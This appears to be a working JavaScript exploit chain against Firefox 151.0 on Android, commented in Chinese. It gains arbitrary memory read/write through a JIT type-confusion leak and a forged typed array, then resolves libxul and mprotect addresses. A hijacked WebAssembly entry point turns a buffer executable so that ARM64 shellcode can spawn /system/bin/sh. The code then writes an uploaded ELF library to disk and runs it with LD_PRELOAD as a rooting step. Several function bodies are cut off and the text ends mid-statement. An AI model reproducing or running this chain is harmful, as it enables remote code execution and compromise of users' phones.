function dbgDump(label, obj) {
  dbgLog('── ' + label + ' ──');
  try {
    const keys = Object.keys(obj);
    for (const k of keys) {
      let v = obj[k];
      if (typeof v === 'bigint') v = '0x' + v.toString(16);
      else if (v instanceof Uint8Array) v = '<Uint8Array len=' + v.length + '>';
      else if (typeof v === 'object' && v !== null) {
        try { v = JSON.stringify(v); } catch (e) { v = String(v); }

function dbgHex(addr) {

function quit(code) {

const convBuf = new ArrayBuffer(8);

function f64FromBits(bits) {
  convU64[0] = bits;

function bitsFromF64(num) {
  convF64[0] = num;

function delay() {
  return new Promise((resolve) => setTimeout(resolve, 0));

async function yieldJit() {
  for (let i = 0; i < 8; i++) {

async function leakTypedWord(preProps, tag) {
  const BASE_PROPS = preProps - 2;
  const SHAPES = 4;
  const ITERS = 1700;

  const names = [];
  for (let i = 0; i < BASE_PROPS + SHAPES + 4; i++) {

  const atomizer = {};
  for (let i = 0; i < names.length; i++) {

  function make(k, allocateAdjacent) {

    for (let i = 0; i < BASE_PROPS + k; i++) {
      g[names[i]] = i;
    }
    g.p = 13;
    g.r = 37;
    if (allocateAdjacent) {

  function makeNumberName(k) {
    const g = make(k, false);
    Object.defineProperty(g, "name", {
      value: 13.37,
      writable: true,
      configurable: true,
    });

  function leak(o) {

    Object.keys(o);
    const y = o.name;

    } else {

  await yieldJit();
  return bitsFromF64(leak(make(0, true)));

    if (isLikelyUserPtr(carrierSlots)) {
      logOk('carrier_slots=0x' + carrierSlots.toString(16) + ' (attempt ' + attempt + ')');
      break;
    }
    logWarn('carrier 泄漏值无效 (0x' + carrierSlots.toString(16) + '), 重试 ' + attempt + '/' + CARRIER_LEAK_MAX);
    if (attempt === CARRIER_LEAK_MAX) {
      logErr('carrier 泄漏连续 ' + CARRIER_LEAK_MAX + ' 次失败');
      dbgDump('Stage2 carrier 泄漏失败', { lastValue: '0x' + carrierSlots.toString(16), typedShape: '0x' + typedShape.toString(16) });
      quit(23);
    }
    await yieldJit();
  }

  const fakeObject = carrierSlots;
  const writeTarget = carrierSlots + 8n * 8n;
  requireUserPtr(fakeObject, 24);
  requireUserPtr(writeTarget, 25);
  requireAlignedPtr(carrierSlots, 0xfn, 38);
  forgedObjectAddress = fakeObject;
  logOk('fake_object=0x' + fakeObject.toString(16));
  dbgDump('Stage2 Carrier', { carrierSlots, fakeObject, writeTarget, CARRIER_FIXED_SLOTS });

  function installFakeTypedArrayLayout() {
    setFakeWord(0, typedShape);
    setFakeWord(1, typedEmptySlots);
    setFakeWord(2, typedEmptyElements);
    carrier[CARRIER_FIELDS[CARRIER_FIXED_SLOTS + 3]] = false;
    setFakeWord(4, 0x100n);
    setFakeWord(5, 0n);
    setFakeWord(6, writeTarget);
    setFakeWord(8, 0x42n);
  }

  installFakeTypedArrayLayout();
  await warmForge(fakeObject);
  installFakeTypedArrayLayout();

  // ── Stage 3: Verify AAW (Arbitrary Address Write) ──
  logInfo('[3/7] 验证 AAW 原语...');
  let after = 0n;
  forgeWriteFinalK = 2;
  const writeProbeValue = 0x32;
  setFakeWord(8, 0xa0n);
  forgedWriteByte(writeTarget, writeProbeValue);
  after = getFakeWord(8);
  const foundWriteForgeK = after === BigInt(writeProbeValue) ? forgeWriteFinalK : -1;
  if (foundWriteForgeK < 0) {
    logErr('AAW 验证失败');
    dbgDump('Stage3 AAW 失败', { probeValue: writeProbeValue, afterValue: after, expected: writeProbeValue, actual: after });
    quit(2);
  }
  logOk('AAW_READY');
  dbgLog('[Stage3] AAW 验证通过, writeForgeK=' + forgeWriteFinalK + ', after=' + dbgHex(after));
  if (stopAt("aaw")) return;

  // ── Stage 4: Verify AAR (Arbitrary Address Read) ──
  logInfo('[4/7] 验证 AAR 原语...');
  let directRead = -1;
  forgeReadFinalK = 2;
  setFakeWord(8, 0x52n);
  directRead = forgedReadByte(writeTarget);
  const foundReadForgeK = directRead === 0x52 ? forgeReadFinalK : -1;
  if (foundReadForgeK < 0) {
    logErr('AAR 验证失败');
    dbgDump('Stage4 AAR 失败', { expected: 0x52, actual: directRead });
    quit(4);
  }
  logOk('AAR_READY');
  dbgLog('[Stage4] AAR 验证通过, readForgeK=' + forgeReadFinalK + ', directRead=0x' + directRead.toString(16));
  if (stopAt("aar")) return;

  function readByte(addr) {
    return forgedReadByte(addr);
  }

  function writeByte(addr, value) {
    forgedWriteByte(addr, value);
  }

  const real = new Uint8Array(0x100);
  keep.push(real);

  function read64(addr) {
    let result = 0n;
    for (let i = 0; i < 8; i++) {
      result |= BigInt(readByte(addr + BigInt(i))) << (8n * BigInt(i));
    }
    return result;
  }

  function write64(addr, value) {
    for (let i = 0; i < 8; i++) {
      writeByte(addr + BigInt(i), Number((value >> (8n * BigInt(i))) & 0xffn));
    }
  }

  const ADDROF_SLOT = 16;
  function addrof(obj) {
    carrier[CARRIER_FIELDS[CARRIER_FIXED_SLOTS + ADDROF_SLOT]] = obj;
    return read64(carrierSlots + 8n * BigInt(ADDROF_SLOT)) & 0xffffffffffffn;
  }

  const realAddr = addrof(real);
  requireUserPtr(realAddr, 26);
  const realShapeFromAar = read64(realAddr);
  const realData = read64(realAddr + 48n);
  requireUserPtr(realData, 27);
  if (realShapeFromAar !== typedShape) {
    logErr('ADDROF 验证失败');
    quit(5);
  }
  logOk('ADDROF_READY');
  if (stopAt("addrof")) return;

  writeByte(realData + 7n, 0x5a);
  if (real[7] !== 0x5a) {
    quit(6);
  }

  const rwTarget = realData + 0x20n;
  write64(rwTarget, 0x1122334455667788n);
  const rwCheck = read64(rwTarget);
  if (rwCheck !== 0x1122334455667788n) {
    quit(7);
  }
  logOk('RW64_READY');
  if (stopAt("rw64")) return;

  // ── Stage 5: Resolve libxul offsets ──
  logInfo('[5/7] 定位 libxul.so 基址与 mprotect...');
  const ARRAY_ISARRAY_NATIVE_OFF = 0x3075720n;
  const MPROTECT_GOT_OFF = 0x8f2a0b8n;
  const WASM_UNCHECKED_ENTRY_SLOT_OFFSET = 56n;

  const leakFunctionAddr = addrof(Array.isArray);
  requireUserPtr(leakFunctionAddr, 28);
  const leakFunctionNative = read64(leakFunctionAddr + 32n);
  const jsBase = leakFunctionNative - ARRAY_ISARRAY_NATIVE_OFF;
  requireUserPtr(leakFunctionNative, 29);
  requireUserPtr(jsBase, 30);
  requireAlignedPtr(leakFunctionNative, 0x3n, 41);
  if ((jsBase & 0xfffn) !== 0n) {
    dbgDump('Stage5 偏移量不匹配', {
      leakFunctionAddr,
      nativeFunc: dbgHex(leakFunctionNative),
      ARRAY_ISARRAY_NATIVE_OFF: dbgHex(ARRAY_ISARRAY_NATIVE_OFF),
      jsBase: dbgHex(jsBase),
      jsBaseLowBits: dbgHex(jsBase & 0xfffn),
      reason: 'Array.isArray native 偏移量 0x3075720 与当前 Firefox 构建不匹配',
      fix: '请确认 Firefox 版本为官方 151.0 Release (非 Beta/Nightly/自定义构建)'
    });
    logErr('libxul 偏移量不匹配: jsBase=0x' + jsBase.toString(16) + ' (低12位应为0)');
    logErr('当前 Firefox 151.0 构建的 libxul.so 布局与预期不同');
    logErr('请下载日志发给开发者, 或尝试官方 Firefox 151.0 Release 版本');
  }
  requireLowBits(jsBase, 0xfffn, 0n, 42);
  const mprotectPtr = read64(jsBase + MPROTECT_GOT_OFF);
  requireUserPtr(mprotectPtr, 31);
  requireAlignedPtr(mprotectPtr, 0x3n, 43);
  logOk('js_base=0x' + jsBase.toString(16));
  logOk('mprotect=0x' + mprotectPtr.toString(16));
  dbgDump('Stage5 libxul 定位', {
    arrayIsArrayAddr: leakFunctionAddr,
    nativeFunc: leakFunctionNative,
    ARRAY_ISARRAY_NATIVE_OFF,
    jsBase,
    MPROTECT_GOT_OFF,
    mprotectPtr
  });
  if (stopAt("libxul")) return;

  // ── Stage 6: Set up shellcode + WASM execution ──
  logInfo('[6/7] 准备 Shellcode 与 WASM 调用...');
  const shellBuf = new Uint8Array(0x4000);
  const outputBuf = new Uint8Array(0x40000);
  keep.push(shellBuf);
  keep.push(outputBuf);
  const shellBufAddr = addrof(shellBuf);
  const outputBufAddr = addrof(outputBuf);
  requireUserPtr(shellBufAddr, 32);
  requireUserPtr(outputBufAddr, 48);
  const shellData = read64(shellBufAddr + 48n);
  const outputData = read64(outputBufAddr + 48n);
  const shellAddr = (shellData + 0xfffn) & ~0xfffn;
  requireUserPtr(shellData, 33);
  requireUserPtr(shellAddr, 34);
  requireUserPtr(outputData, 49);
  const shellOffset = Number(shellAddr - shellData);

  // ARM64 shellcode: pipe(), fork(), child execve("/system/bin/sh",[sh,-c,CMD]), parent reads stdout.
  const captureCodeBytes = [
    0xfd, 0x7b, 0xbf, 0xa9,  // stp x29, x30, [sp, #-16]!
    0xfd, 0x03, 0x00, 0x91,  // mov x29, sp
    0xf3, 0x53, 0xbf, 0xa9,  // stp x19, x20, [sp, #-16]!
    0xf5, 0x5b, 0xbf, 0xa9,  // stp x21, x22, [sp, #-16]!
    0xf7, 0x63, 0xbf, 0xa9,  // stp x23, x24, [sp, #-16]!
    0xff, 0x43, 0x00, 0xd1,  // sub sp, sp, #0x10
    0xf3, 0x03, 0x00, 0xaa,  // mov x19, x0
    0xf4, 0x03, 0x01, 0xaa,  // mov x20, x1
    0xe0, 0x03, 0x00, 0x91,  // mov x0, sp
    0xe1, 0x03, 0x1f, 0xaa,  // mov x1, xzr
    0x68, 0x07, 0x80, 0xd2,  // mov x8, #0x3b // #59
    0x01, 0x00, 0x00, 0xd4,  // svc #0x0
    0x1f, 0x00, 0x00, 0xf1,  // cmp x0, #0x0
    0x6b, 0x08, 0x00, 0x54,  // b.lt 140 <fail>
    0xf5, 0x03, 0x40, 0xb9,  // ldr w21, [sp]
    0xf6, 0x07, 0x40, 0xb9,  // ldr w22, [sp, #4]
    0x20, 0x02, 0x80, 0xd2,  // mov x0, #0x11 // #17
    0xe1, 0x03, 0x1f, 0xaa,  // mov x1, xzr
    0xe2, 0x03, 0x1f, 0xaa,  // mov x2, xzr
    0xe3, 0x03, 0x1f, 0xaa,  // mov x3, xzr
    0xe4, 0x03, 0x1f, 0xaa,  // mov x4, xzr
    0x88, 0x1b, 0x80, 0xd2,  // mov x8, #0xdc // #220
    0x01, 0x00, 0x00, 0xd4,  // svc #0x0
    0xe0, 0x03, 0x00, 0xb5,  // cbnz x0, d8 <parent>
    0xe0, 0x03, 0x15, 0x2a,  // mov w0, w21
    0x28, 0x07, 0x80, 0xd2,  // mov x8, #0x39 // #57
    0x01, 0x00, 0x00, 0xd4,  // svc #0x0
    0xe0, 0x03, 0x16, 0x2a,  // mov w0, w22
    0x21, 0x00, 0x80, 0xd2,  // mov x1, #0x1 // #1
    0xe2, 0x03, 0x1f, 0xaa,  // mov x2, xzr
    0x08, 0x03, 0x80, 0xd2,  // mov x8, #0x18 // #24
    0x01, 0x00, 0x00, 0xd4,  // svc #0x0
    0xe0, 0x03, 0x16, 0x2a,  // mov w0, w22
    0x41, 0x00, 0x80, 0xd2,  // mov x1, #0x2 // #2
    0xe2, 0x03, 0x1f, 0xaa,  // mov x2, xzr
    0x08, 0x03, 0x80, 0xd2,  // mov x8, #0x18 // #24
    0x01, 0x00, 0x00, 0xd4,  // svc #0x0
    0xe0, 0x03, 0x16, 0x2a,  // mov w0, w22
    0x28, 0x07, 0x80, 0xd2,  // mov x8, #0x39 // #57
    0x01, 0x00, 0x00, 0xd4,  // svc #0x0
    0xe0, 0x05, 0x00, 0x10,  // adr x0, 15c <sh_path>
    0xc3, 0x05, 0x00, 0x10,  // adr x3, 15c <sh_path>
    0x04, 0x06, 0x00, 0x70,  // adr x4, 16b <dash_c>
    0x05, 0x06, 0x00, 0x50,  // adr x5, 16e <cmd_str>
    0xff, 0x83, 0x00, 0xd1,  // sub sp, sp, #0x20
    0xe3, 0x13, 0x00, 0xa9,  // stp x3, x4, [sp]
    0xe5, 0x7f, 0x01, 0xa9,  // stp x5, xzr, [sp, #16]
    0xe1, 0x03, 0x00, 0x91,  // mov x1, sp
    0xe2, 0x03, 0x1f, 0xaa,  // mov x2, xzr
    0xa8, 0x1b, 0x80, 0xd2,  // mov x8, #0xdd // #221
    0x01, 0x00, 0x00, 0xd4,  // svc #0x0
    0x20, 0x00, 0x80, 0xd2,  // mov x0, #0x1 // #1
    0xa8, 0x0b, 0x80, 0xd2,  // mov x8, #0x5d // #93
    0x01, 0x00, 0x00, 0xd4,  // svc #0x0
    // parent:
    0xe0, 0x03, 0x16, 0x2a,  // mov w0, w22
    0x28, 0x07, 0x80, 0xd2,  // mov x8, #0x39 // #57
    0x01, 0x00, 0x00, 0xd4,  // svc #0x0
    0xf7, 0x03, 0x1f, 0xaa,  // mov x23, xzr
    0x9f, 0x06, 0x00, 0xf1,  // cmp x20, #0x1
    0xa9, 0x01, 0x00, 0x54,  // b.ls 120 <terminate>
    0x98, 0x06, 0x00, 0xd1,  // sub x24, x20, #0x1
    // read_loop:
    0x78, 0x01, 0x00, 0xb4,  // cbz x24, 120 <terminate>
    0xe0, 0x03, 0x15, 0x2a,  // mov w0, w21
    0x61, 0x02, 0x17, 0x8b,  // add x1, x19, x23
    0xe2, 0x03, 0x18, 0xaa,  // mov x2, x24
    0xe8, 0x07, 0x80, 0xd2,  // mov x8, #0x3f // #63
    0x01, 0x00, 0x00, 0xd4,  // svc #0x0
    0x1f, 0x00, 0x00, 0xf1,  // cmp x0, #0x0
    0x8d, 0x00, 0x00, 0x54,  // b.le 120 <terminate>
    0xf7, 0x02, 0x00, 0x8b,  // add x23, x23, x0
    0x18, 0x03, 0x00, 0xcb,  // sub x24, x24, x0
    0xf6, 0xff, 0xff, 0x17,  // b f4 <read_loop>
    // terminate:
    0x74, 0x00, 0x00, 0xb4,  // cbz x20, 12c <close_read>
    0x63, 0x02, 0x17, 0x8b,  // add x3, x19, x23
    0x7f, 0x00, 0x00, 0x39,  // strb wzr, [x3]
    // close_read:
    0xe0, 0x03, 0x15, 0x2a,  // mov w0, w21
    0x28, 0x07, 0x80, 0xd2,  // mov x8, #0x39 // #57
    0x01, 0x00, 0x00, 0xd4,  // svc #0x0
    0xe0, 0x03, 0x17, 0xaa,  // mov x0, x23
    0x02, 0x00, 0x00, 0x14,  // b 144 <done>
    // fail:
    0xe0, 0x03, 0x1f, 0xaa,  // mov x0, xzr
    // done:
    0xff, 0x43, 0x00, 0x91,  // add sp, sp, #0x10
    0xf7, 0x63, 0xc1, 0xa8,  // ldp x23, x24, [sp], #16
    0xf5, 0x5b, 0xc1, 0xa8,  // ldp x21, x22, [sp], #16
    0xf3, 0x53, 0xc1, 0xa8,  // ldp x19, x20, [sp], #16
    0xfd, 0x7b, 0xc1, 0xa8,  // ldp x29, x30, [sp], #16
    0xc0, 0x03, 0x5f, 0xd6,  // ret
    0x2f, 0x73, 0x79, 0x73,  // "/sys"
    0x74, 0x65, 0x6d, 0x2f,  // "tem/"
    0x62, 0x69, 0x6e, 0x2f,  // "bin/"
    0x73, 0x68, 0x00,        // "sh\0"
    0x2d, 0x63, 0x00,        // "-c\0"
  ];

  const spawnCodeBytes = [
    0xfd, 0x7b, 0xbf, 0xa9,  // stp  x29, x30, [sp, #-16]!
    0xfd, 0x03, 0x00, 0x91,  // mov  x29, sp
    0x20, 0x02, 0x80, 0xd2,  // mov  x0, #17            (SIGCHLD)
    0xe1, 0x03, 0x1f, 0xaa,  // mov  x1, xzr
    0xe2, 0x03, 0x1f, 0xaa,  // mov  x2, xzr
    0xe3, 0x03, 0x1f, 0xaa,  // mov  x3, xzr
    0xe4, 0x03, 0x1f, 0xaa,  // mov  x4, xzr
    0x88, 0x1b, 0x80, 0xd2,  // mov  x8, #220           (__NR_clone)
    0x01, 0x00, 0x00, 0xd4,  // svc  #0
    0xe0, 0x01, 0x00, 0xb5,  // cbnz x0, parent
    0x20, 0x02, 0x00, 0x10,  // adr  x0, sh_path
    0x03, 0x02, 0x00, 0x10,  // adr  x3, sh_path
    0x44, 0x02, 0x00, 0x70,  // adr  x4, dash_c
    0x45, 0x02, 0x00, 0x50,  // adr  x5, cmd_str
    0xff, 0x83, 0x00, 0xd1,  // sub  sp, sp, #32
    0xe3, 0x13, 0x00, 0xa9,  // stp  x3, x4, [sp]
    0xe5, 0x7f, 0x01, 0xa9,  // stp  x5, xzr, [sp, #16]
    0xe1, 0x03, 0x00, 0x91,  // mov  x1, sp
    0xe2, 0x03, 0x1f, 0xaa,  // mov  x2, xzr
    0xa8, 0x1b, 0x80, 0xd2,  // mov  x8, #221           (__NR_execve)
    0x01, 0x00, 0x00, 0xd4,  // svc  #0
    0x20, 0x00, 0x80, 0xd2,  // mov  x0, #1
    0xa8, 0x0b, 0x80, 0xd2,  // mov  x8, #93            (__NR_exit)
    0x01, 0x00, 0x00, 0xd4,  // svc  #0
    // parent:
    0xfd, 0x7b, 0xc1, 0xa8,  // ldp  x29, x30, [sp], #16
    0x1f, 0x20, 0x03, 0xd5,  // nop                     (preserve clone return)
    0xc0, 0x03, 0x5f, 0xd6,  // ret
    0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x2d, 0x63, 0x00, // "/system/bin/sh\0-c\0"
  ];

  let cmdPos = 0;
  let maxCmdLength = 0;

  function installShellcode(bytes) {
    cmdPos = shellOffset + bytes.length;
    maxCmdLength = shellBuf.length - cmdPos - 1;
    if (shellOffset < 0 || maxCmdLength <= 0) {
      quit(44);
    }
    for (let i = 0; i < bytes.length; i++) {
      shellBuf[shellOffset + i] = bytes[i];
    }
  }

  installShellcode(captureCodeBytes);

  function writeShellCommand(command) {
    const cmdStr = String(command);
    if (cmdStr.length > maxCmdLength) {
      quit(44);
    }
    for (let i = 0; i <= maxCmdLength; i++) {
      shellBuf[cmdPos + i] = 0;
    }
    for (let i = 0; i < cmdStr.length; i++) {
      shellBuf[cmdPos + i] = cmdStr.charCodeAt(i) & 0xff;
    }
  }

  // WASM modules: f(i64, i64, i64) -> i32
  const wasmTargetBytes = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x08, 0x01, 0x60, 0x03, 0x7e, 0x7e, 0x7e, 0x01, 0x7f,
    0x03, 0x02, 0x01, 0x00,
    0x07, 0x05, 0x01, 0x01, 0x66, 0x00, 0x00,
    0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x00, 0x0b,
  ]);

  const wasmCallerBytes = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x08, 0x01, 0x60, 0x03, 0x7e, 0x7e, 0x7e, 0x01, 0x7f,
    0x02, 0x09, 0x01, 0x03, 0x65, 0x6e, 0x76, 0x01, 0x66, 0x00, 0x00,
    0x03, 0x02, 0x01, 0x00,
    0x07, 0x08, 0x01, 0x04, 0x63, 0x61, 0x6c, 0x6c, 0x00, 0x01,
    0x0a, 0x0c, 0x01, 0x0a, 0x00, 0x20, 0x00, 0x20, 0x01, 0x20, 0x02,
    0x10, 0x00, 0x0b,
  ]);

  function makeWasm(bytes, imports) {
    return new WebAssembly.Instance(new WebAssembly.Module(bytes), imports || {});
  }

  const wasmTarget = makeWasm(wasmTargetBytes);
  const wasmFunction = wasmTarget.exports.f;
  keep.push(wasmTarget, wasmFunction);

  const wasmFunctionAddr = addrof(wasmFunction);
  requireUserPtr(wasmFunctionAddr, 47);
  const originalUncheckedEntry =
    read64(wasmFunctionAddr + WASM_UNCHECKED_ENTRY_SLOT_OFFSET);
  requireUserPtr(originalUncheckedEntry, 45);
  requireAlignedPtr(originalUncheckedEntry, 0x3n, 46);

  function setWasmUncheckedEntry(ptr) {
    write64(wasmFunctionAddr + WASM_UNCHECKED_ENTRY_SLOT_OFFSET, ptr);
  }

  _wasmRestoreFn = function() {
    try { setWasmUncheckedEntry(originalUncheckedEntry); } catch(_){}
    try { shellBuf.fill(0); } catch(_){}
  };

  // Step 1: mprotect shellcode buffer as RWX
  setWasmUncheckedEntry(mprotectPtr);
  const mprotectCaller = makeWasm(wasmCallerBytes, {env: {f: wasmFunction}}).exports.call;
  const mprotectRet = mprotectCaller(shellAddr, 0x1000n, 7n);
  if (mprotectRet !== 0) {
    logErr('mprotect 失败, ret=' + mprotectRet);
    quit(1);
  }
  logOk('MPROTECT_READY');
  dbgDump('Stage6 mprotect', { shellAddr, shellOffset, mprotectRet, shellBufLen: shellBuf.length });
  if (stopAt("mprotect")) return;

  // Step 2: call shellcode
  setWasmUncheckedEntry(shellAddr);
  const shellCaller = makeWasm(wasmCallerBytes, {env: {f: wasmFunction}}).exports.call;

  function readOutput(length) {
    let result = "";
    const limit = Math.min(Math.max(length, 0), outputBuf.length);
    for (let i = 0; i < limit; i++) {
      const value = outputBuf[i];
      if (value === 0) {
        break;
      }
      result += String.fromCharCode(value);
    }
    return result;
  }

  function runCaptureCommand(command, code) {
    installShellcode(captureCodeBytes);
    writeShellCommand(command);
    outputBuf.fill(0);
    const ret = shellCaller(outputData, BigInt(outputBuf.length), 0n);
    if (ret <= 0) {
      quit(code);
    }
    return {
      ret,
      output: readOutput(ret),
    };
  }

  function runSpawnCommand(command, code) {
    installShellcode(spawnCodeBytes);
    writeShellCommand(command);
    const ret = shellCaller(0n, 0n, 0n);
    if (ret <= 0) {
      quit(code);
    }
    return ret;
  }

  logOk('shellcode=0x' + shellAddr.toString(16));
  logOk('wasm_function=0x' + wasmFunctionAddr.toString(16));

  // ── Stage 7: Write preload.so and execute ──
  logInfo('[7/7] 写入 preload.so 并执行 Root 命令...');

  // ELF magic: 0x7f 'E' 'L' 'F'
  if (preloadSoData.length < 4 ||
      preloadSoData[0] !== 0x7f || preloadSoData[1] !== 0x45 ||
      preloadSoData[2] !== 0x4c || preloadSoData[3] !== 0x46) {
    logErr('文件不是有效的 ELF 共享库 (expected magic: 7f454c46)');
    dbgDump('Stage7 ELF校验失败', {
      fileSize: preloadSoData.length,
      first4Bytes: preloadSoData.length >= 4
        ? dbgHex((preloadSoData[0] << 24) | (preloadSoData[1] << 16) | (preloadSoData[2] << 8) | preloadSoData[3])
        : 'N/A',
      hint: '请确认上传的是编译产物 .so 文件, 而非 APK/ZIP/源码包等'
    });
    quit(54);
  }
  dbgLog('[Stage7] ELF magic 校验通过: 7f454c46');

  const PRELOAD_TARGET = PRIVATE_DIR + "/res";

  // Create target directory and empty file
  const initWriteResult = runCaptureCommand(
    "dir=" + shellQuote(PRIVATE_DIR) +
      "; file=" + shellQuote(PRELOAD_TARGET) +
      "; /system/bin/mkdir -p \"$dir\"" +
      " && : > \"$file\"" +
      " && /system/bin/printf OK || /system/bin/printf FAIL",
    9
  );
  if (initWriteResult.output.indexOf("OK") !== 0) {
    logErr('创建目标文件失败: ' + initWriteResult.output);
    dbgDump('Stage7 创建文件失败', {
      PRIVATE_DIR, PRELOAD_TARGET,
      output: initWriteResult.output,
      note: 'Firefox untrusted_app 域可能无权写此目录, 请确认路径正确'
    });
    quit(52);
  }
  logOk('目标文件已创建: ' + PRELOAD_TARGET);
  dbgLog('[Stage7] 目标文件创建成功: ' + PRELOAD_TARGET);
  await delay();

  // Write preload.so in chunks via base64
  let totalWritten = 0;
  const CHUNK_SIZE = 4096;
  const writeChunk = (bytes) => {
    let binary = "";
    for (let i = 0; i < bytes.length; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    const writeResult = runCaptureCommand(
      "file=" + shellQuote(PRELOAD_TARGET) +
        "; /system/bin/printf %s " + shellQuote(btoa(binary)) +
        " | base64 -d >> \"$file\"" +
        " && /system/bin/printf OK || /system/bin/printf FAIL",
      10
    );
    if (writeResult.output.indexOf("OK") !== 0) {
      logErr('写入块失败');
      dbgDump('Stage7 写入块失败', { offset: totalWritten, chunkLen: bytes.length, output: writeResult.output });
      quit(53);
    }
  };

  logInfo('写入 preload.so (' + preloadSoData.length + ' bytes)...');
  dbgLog('[Stage7] 开始分块写入, 总大小=' + preloadSoData.length + ', CHUNK_SIZE=' + CHUNK_SIZE);
  for (let offset = 0; offset < preloadSoData.length; offset += CHUNK_SIZE) {
    const end = Math.min(offset + CHUNK_SIZE, preloadSoData.length);
    writeChunk(preloadSoData.subarray(offset, end));
    totalWritten += (end - offset);
    const pct = Math.round((totalWritten / preloadSoData.length) * 100);
    logRaw('  写入进度: ' + totalWritten + '/' + preloadSoData.length + ' (' + pct + '%)');
    await delay();
  }
  logOk('preload.so 写入完成 (' + totalWritten + ' bytes)');
  dbgLog('[Stage7] 写入完成, totalWritten=' + totalWritten);
  await delay();

  // Verify file size
  const verifyResult = runCaptureCommand(
    "file=" + shellQuote(PRELOAD_TARGET) +
      "; /system/bin/ls -l \"$file\" | /system/bin/awk '{print $5}'",
    14
  );
  const verifiedSize = verifyResult.output.trim();
  logInfo('文件大小验证: ' + verifiedSize + ' bytes');
  dbgDump('Stage7 文件验证', { expected: preloadSoData.length, actual: verifiedSize, match: String(preloadSoData.length) === verifiedSize });
  await delay();

  // Verify ELF magic content (not just size)
  const magicCheck = runCaptureCommand(
    "file=" + shellQuote(PRELOAD_TARGET) +
      "; /system/bin/xxd -l 4 -p \"$file\" 2>/dev/null" +
      " || /system/bin/head -c 4 \"$file\" | /system/bin/od -An -tx1 | /system/bin/tr -d ' '",
    99
  );
  const readMagic = magicCheck.output.trim().replace(/\s/g, '').toLowerCase();
  dbgLog('[Stage7] 文件头部 magic: ' + readMagic);
  const expectedMagic = '7f454c46';

  if (readMagic !== expectedMagic) {
    logWarn('base64 写入验证失败 (magic=' + readMagic + '), 尝试 hex 编码重写...');
    dbgDump('Stage7 base64 写入内容错误', { expected: expectedMagic, actual: readMagic, fileSize: verifiedSize });

    // Rewrite using hex encoding (xxd -r -p)
    runCaptureCommand(
      "file=" + shellQuote(PRELOAD_TARGET) + "; : > \"$file\"", 99
    );
    let hexTotal = 0;
    const HEX_CHUNK = 2048;
    for (let offset = 0; offset < preloadSoData.length; offset += HEX_CHUNK) {
      const end = Math.min(offset + HEX_CHUNK, preloadSoData.length);
      const chunk = preloadSoData.subarray(offset, end);
      let hex = '';
      for (let i = 0; i < chunk.length; i++) {
        hex += hexTable[chunk[i]];
      }
      const hexResult = runCaptureCommand(
        "file=" + shellQuote(PRELOAD_TARGET) +
          "; /system/bin/printf %s " + shellQuote(hex) +
          " | /system/bin/xxd -r -p >> \"$file\"" +
          " && /system/bin/printf OK || /system/bin/printf FAIL",
        99
      );
      if (hexResult.output.indexOf("OK") !== 0) {
        logErr('hex 写入块失败');
        quit(53);
      }
      hexTotal += (end - offset);
      logRaw('  hex 重写进度: ' + hexTotal + '/' + preloadSoData.length);
      await delay();
    }

    // Re-verify after hex rewrite
    const reCheck = runCaptureCommand(
      "file=" + shellQuote(PRELOAD_TARGET) +
        "; /system/bin/xxd -l 4 -p \"$file\" 2>/dev/null" +
        " || /system/bin/head -c 4 \"$file\" | /system/bin/od -An -tx1 | /system/bin/tr -d ' '",
      99
    );
    const reMagic = reCheck.output.trim().replace(/\s/g, '').toLowerCase();
    dbgLog('[Stage7] hex 重写后 magic: ' + reMagic);
    if (reMagic !== expectedMagic) {
      logErr('hex 重写后仍然无效 (magic=' + reMagic + ')');
      dbgDump('Stage7 hex 重写也失败', { expected: expectedMagic, actual: reMagic });
      quit(54);
    }
    logOk('hex 编码重写验证通过');
  } else {
    logOk('ELF magic 内容验证通过');
  }
  await delay();

  // Execute with LD_PRELOAD
  const ROOT_CMD = "id; echo ROOT_SUCCESS";
  logInfo('执行: LD_PRELOAD=' + PRELOAD_TARGET + ' env');

  const commandOutputTarget = PRIVATE_DIR + "/result";
  const commandDoneTarget = PRIVATE_DIR + "/result.done";

  const initCommandResult = runCaptureCommand(
    "out=" + shellQuote(commandOutputTarget) +
      "; done=" + shellQuote(commandDoneTarget) +
      "; /system/bin/rm -f \"$out\" \"$done\"" +
      " && /system/bin/printf OK || /system/bin/printf FAIL",
    11
  );
  if (initCommandResult.output.indexOf("OK") !== 0) {
    quit(54);
  }

  runSpawnCommand(
    "file=" + shellQuote(PRELOAD_TARGET) +
      "; out=" + shellQuote(commandOutputTarget) +
      "; done=" + shellQuote(commandDoneTarget) +
      "; { LD_PRELOAD=\"$file\" env; status=$?; } >> \"$out\" 2>&1" +
      "; /system/bin/printf %s \"$status\" > \"$done\"",
    12
  );
  dbgDump('Stage7 执行命令', { preloadTarget: PRELOAD_TARGET, out: commandOutputTarget, done: commandDoneTarget, method: 'LD_PRELOAD env' });
  await delay();

  // Poll for result
  let commandOutput = "";
  let commandOffset = 0;
  let commandStatus = "";
  let commandPollResult = null;
  let pollCount = 0;
  for (;;) {
    await new Promise((resolve) => setTimeout(resolve, 500));
    pollCount++;
    commandPollResult = runCaptureCommand(
      "out=" + shellQuote(commandOutputTarget) +
        "; done=" + shellQuote(commandDoneTarget) +
        "; offset=" + commandOffset +
        "; if [ -f \"$done\" ]; then /system/bin/printf '__DONE__'; /system/bin/cat \"$done\"; /system/bin/printf '\\n'; else /system/bin/printf '__POLL__\\n'; fi" +
        "; if [ -f \"$out\" ]; then /system/bin/tail -c +$((offset + 1)) \"$out\"; fi",
      13
    );
    if (commandPollResult.output.indexOf("__DONE__") === 0) {
      const split = commandPollResult.output.indexOf("\n");
      if (split < 0) {
        quit(55);
      }
      commandStatus = commandPollResult.output.slice(8, split).trim();
      const delta = commandPollResult.output.slice(split + 1);
      commandOutput += delta;
      commandOffset += delta.length;
      break;
    }
    if (commandPollResult.output.indexOf("__POLL__\n") !== 0) {
      quit(56);
    }
    const delta = commandPollResult.output.slice(9);
    commandOutput += delta;
    commandOffset += delta.length;
    logRaw('  等待执行结果... (' + pollCount + ')');
  }
  commandOutput = commandOutput.trim();

  dbgDump('Stage7 最终结果', {
    commandOutput,
    commandStatus,
    pollCount,
